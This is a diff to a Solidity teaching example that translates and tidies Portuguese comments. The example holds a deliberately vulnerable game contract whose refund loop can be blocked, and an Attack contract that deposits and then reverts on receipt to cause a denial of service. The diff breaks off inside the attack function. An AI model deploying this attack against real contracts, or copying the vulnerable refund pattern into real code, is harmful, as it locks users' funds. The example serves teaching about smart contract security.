@@ -1,27 +1,27 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
-// Jogo com vulnerabilidade de DoS, os jogadores depositam dinheiro primeiro, e depois, ao final do jogo, chamam o método deposit para retirar o dinheiro de volta.
+// Jogo com vulnerabilidade de DoS, os jogadores depositam dinheiro primeiro e, após o término do jogo, chamam a função deposit para retirar o dinheiro.
 contract DoSGame {
     bool public refundFinished;
     mapping(address => uint256) public balanceOf;
     address[] public players;
     
-    // Todos os jogadores depositam ETH no contrato.
+    // Todos os jogadores depositam ETH no contrato
     function deposit() external payable {
         require(!refundFinished, "Game Over");
         require(msg.value > 0, "Please donate ETH");
-        // Registre o depósito
+        // Registrar depósito
         balanceOf[msg.sender] = msg.value;
-        // Record player address
+        // Registrar endereço do jogador
         players.push(msg.sender);
     }
 
-    O jogo acabou, o reembolso começou, todos os jogadores receberão reembolso em sequência.
+    // O jogo acabou, o reembolso começou e todos os jogadores receberão o reembolso em sequência.
     function refund() external {
         require(!refundFinished, "Game Over");
         uint256 pLength = players.length;
-        // Refund all players through a loop
+        // Através de um loop, reembolsar todos os jogadores
         for(uint256 i; i < pLength; i++){
             address player = players[i];
             uint256 refundETH = balanceOf[player];
@@ -38,14 +38,12 @@ contract DoSGame {
 }
 
 contract Attack {
-    // DoS attack during refund
-
-// Ataque de negação de serviço durante reembolso
+    // Ao solicitar um reembolso, ocorre um ataque de negação de serviço (DoS)
     fallback() external payable{
         revert("DoS Attack!");
     }
 
-    Participar do jogo DoS e fazer um depósito.
+    // Participar do jogo DoS e fazer um depósito.
     function attack(address gameAddr) external payable {
         DoSGame dos = DoSGame(gameAddr);
         dos.deposit{value: msg.value}();
